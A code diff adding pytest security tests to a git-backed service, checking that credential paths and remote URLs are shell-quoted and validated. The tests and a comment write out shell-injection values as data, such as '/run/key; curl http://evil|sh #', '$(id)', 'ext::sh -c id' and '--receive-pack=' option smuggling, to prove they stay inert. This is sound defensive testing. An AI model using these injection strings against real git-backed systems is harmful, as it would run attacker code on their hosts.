@@ -290,3 +290,160 @@ def test_remote_auth_by_scheme(tmp_path):
     assert (argv, env) == ([], {})
     argv, env = _remote_auth(str(tmp_path / "bare.git"), None, None)
     assert (argv, env) == ([], {})
+
+
+# ── remote credential paths + URLs reach a shell: quoting and grammar ──
+#
+# Git runs GIT_SSH_COMMAND through `sh -c`, and a credential helper too. An admin-supplied
+# `auth_ref` of `/run/key; curl evil|sh #` therefore used to execute on every node — from
+# the 15 s backup loop, the replica fetch loop, and synchronously via
+# POST /mgmt/remotes/{id}/push. Two layers now: `_remote_auth` shell-quotes every path
+# (tested here against REAL git), and the schemas/boot refuse anything outside a tight
+# grammar (tested below).
+
+import os  # noqa: E402
+import shlex  # noqa: E402
+
+from incant.gitstore.store import (  # noqa: E402
+    RemoteGitError, _remote_auth, validate_auth_ref, validate_remote_url,
+)
+
+
+def test_remote_auth_quotes_paths_for_the_shell(tmp_path):
+    # Pure: a hostile path becomes ONE quoted word; a plain path is left as-is (the
+    # assertions in test_remote_auth_by_scheme above stay byte-identical).
+    payload = "/run/key; curl http://evil|sh #"
+    argv, env = _remote_auth("git@github.com:org/x.git", payload, "/etc/known hosts")
+    assert env["GIT_SSH_COMMAND"] == (
+        f"ssh -i {shlex.quote(payload)} -o IdentitiesOnly=yes "
+        f"-o UserKnownHostsFile={shlex.quote('/etc/known hosts')}")
+    # shlex round-trips it: the shell will hand ssh exactly these words.
+    assert shlex.split(env["GIT_SSH_COMMAND"]) == [
+        "ssh", "-i", payload, "-o", "IdentitiesOnly=yes",
+        "-o", "UserKnownHostsFile=/etc/known hosts"]
+    argv, _ = _remote_auth("https://github.com/org/x.git", payload, None)
+    assert argv == ["-c", f"credential.helper=store --file={shlex.quote(payload)}"]
+
+
+def _fake_ssh(tmp_path, monkeypatch) -> str:
+    """Put a fake `ssh` first on PATH that records its argv (one per line) and exits
+    255, so a real `git push` over ssh:// exercises git's actual `sh -c` invocation of
+    GIT_SSH_COMMAND without a network. Returns the argv log path."""
+    bin_dir = tmp_path / "bin"
+    bin_dir.mkdir()
+    log = tmp_path / "ssh-argv.log"
+    (bin_dir / "ssh").write_text(
+        "#!/bin/sh\nprintf '%s\\n' \"$@\" > \"$FAKE_SSH_LOG\"\nexit 255\n")
+    (bin_dir / "ssh").chmod(0o755)
+    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ['PATH']}")
+    monkeypatch.setenv("FAKE_SSH_LOG", str(log))
+    return str(log)
+
+
+def test_ssh_command_survives_the_shell_intact(app, tmp_path, monkeypatch):
+    log = _fake_ssh(tmp_path, monkeypatch)
+    key = tmp_path / "with space" / "deploy key"
+    kh = tmp_path / "with space" / "known hosts"
+    key.parent.mkdir()
+    marker = tmp_path / "pwned"
+    # The URL's port is irrelevant — the fake ssh never connects — but git must reach
+    # the point of running GIT_SSH_COMMAND, which needs an ssh:// URL.
+    url = "ssh://127.0.0.1:1/nowhere.git"
+
+    # A path WITH A SPACE reaches ssh as one argument each.
+    with pytest.raises(RemoteGitError):
+        app.git.push_mirror(url, auth_ref=str(key), known_hosts_path=str(kh), timeout=20)
+    argv = open(log).read().splitlines()
+    assert argv[:6] == ["-i", str(key), "-o", "IdentitiesOnly=yes",
+                        "-o", f"UserKnownHostsFile={kh}"]
+
+    # A shell payload is an (inert) filename, not a second command.
+    payload = f"{tmp_path}/key; touch {marker} #"
+    with pytest.raises(RemoteGitError):
+        app.git.push_mirror(url, auth_ref=payload, timeout=20)
+    argv = open(log).read().splitlines()
+    assert argv[:2] == ["-i", payload]
+    assert not marker.exists()
+
+
+def test_credential_helper_path_is_shell_safe(tmp_path):
+    # The https side: git runs `store --file=<path>` via the shell as well. Feed the exact
+    # argv `_remote_auth` produces to `git credential fill`, which invokes the helper the
+    # way a push would.
+    def fill(auth_ref):
+        argv, _ = _remote_auth("https://example.com/x.git", auth_ref, None)
+        return subprocess.run(
+            ["git", *argv, "credential", "fill"], input="protocol=https\nhost=example.com\n",
+            capture_output=True, text=True, env={**os.environ, "GIT_TERMINAL_PROMPT": "0"},
+        )
+
+    creds = tmp_path / "with space" / "creds"
+    creds.parent.mkdir()
+    creds.write_text("https://alice:s3cret@example.com\n")
+    out = fill(str(creds))
+    assert out.returncode == 0 and "password=s3cret" in out.stdout, out.stderr
+
+    marker = tmp_path / "pwned"
+    out = fill(f"{tmp_path}/nope; touch {marker} #")
+    assert out.returncode != 0          # no credential found — and nothing else happened
+    assert not marker.exists()
+
+
+def test_dash_prefixed_url_is_never_an_option(app, tmp_path):
+    # `--` before the positional URL: a value starting with `-` is a bad URL, not an
+    # option git would honour (e.g. --receive-pack=<command>).
+    marker = tmp_path / "pwned"
+    with pytest.raises(RemoteGitError):
+        app.git.push_mirror(f"--receive-pack=touch {marker}")
+    with pytest.raises(RemoteGitError):
+        app.git.mirror_fetch(f"--upload-pack=touch {marker}")
+    assert not marker.exists()
+
+
+def test_remote_grammars():
+    for ok in ["https://git.example.com/x.git", "http://h/x.git", "ssh://h:2222/x.git",
+               "git@github.com:acme/backup.git", "backup-host:incant.git",
+               "file:///var/backups/repo.git", "/var/backups/repo.git"]:
+        assert validate_remote_url(f"  {ok}  ") == ok
+    for bad, why in [("", "empty"), ("   ", "empty"), ("ext::sh -c id", "remote-helper"),
+                     ("fd::3", "remote-helper"), ("git://h/x.git", "allowed forms"),
+                     ("relative/path.git", "allowed forms"), ("-flag", "allowed forms"),
+                     ("https://h/x.git y", "whitespace"), ("/a\nb", "whitespace")]:
+        with pytest.raises(ValueError, match=why):
+            validate_remote_url(bad)
+    for ok in ["/run/secrets/key", "/etc/incant/creds.v2", "/a/b_c-d@e"]:
+        assert validate_auth_ref(ok) == ok
+    for bad in ["", "run/secrets/key", "/run/key; curl evil|sh #", "/run/my key", "-i",
+                "/run/$(id)", "/run/key\n", "/" + "a" * 1100]:
+        with pytest.raises(ValueError):
+            validate_auth_ref(bad)
+
+
+def test_remote_endpoints_refuse_unsafe_url_and_auth_ref(tmp_path):
+    with make_client(tmp_path) as client:
+        remote = _bare(tmp_path / "backup.git")
+        bad_refs = ["/run/key; curl http://evil|sh #", "/run/my key", "relative/key", "-i"]
+        for ref in bad_refs:
+            r = client.post("/mgmt/remotes", json={"url": remote, "auth_ref": ref}, headers=auth())
+            assert r.status_code == 422, (ref, r.text)
+            assert "auth_ref" in r.text
+        for url in ["ext::sh -c id", "git://h/x.git", "relative.git", "-flag", "https://h/x y"]:
+            r = client.post("/mgmt/remotes", json={"url": url}, headers=auth())
+            assert r.status_code == 422, (url, r.text)
+        assert client.get("/mgmt/remotes", headers=auth()).json()["remotes"] == []
+
+        # The documented forms register fine (a clear message names the allowed ones).
+        for url in [remote, "git@github.com:acme/backup.git", "ssh://h/x.git",
+                    "https://h/x.git", f"file://{remote}"]:
+            r = client.post("/mgmt/remotes", json={"url": url, "auth_ref": "/run/secrets/key"},
+                            headers=auth())
+            assert r.status_code == 200, (url, r.text)
+        rid = client.get("/mgmt/remotes", headers=auth()).json()["remotes"][0]["id"]
+
+        # PATCH goes through the same grammar; an empty auth_ref clears the path.
+        for body in [{"url": "ext::id"}, {"url": ""}, {"auth_ref": "/k; id"}]:
+            assert client.patch(f"/mgmt/remotes/{rid}", json=body, headers=auth()).status_code == 422
+        assert client.patch(f"/mgmt/remotes/{rid}", json={"auth_ref": ""},
+                            headers=auth()).status_code == 200
+        with session_scope() as s:
+            assert s.get(models.Remote, rid).auth_ref is None
